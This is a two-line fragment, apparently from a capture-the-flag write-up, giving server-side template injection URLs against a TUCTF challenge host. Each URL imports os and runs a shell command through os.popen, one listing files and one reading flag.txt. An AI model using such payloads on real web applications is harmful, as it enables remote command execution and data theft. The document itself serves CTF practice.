`http://chal.tuctf.com:30007/welcome/{% import os %}{{ os.popen("ls -lah").read() }}

and

`http://chal.tuctf.com:30007/welcome/{% import os %}{{ os.popen("cat flag.txt").read() }}`
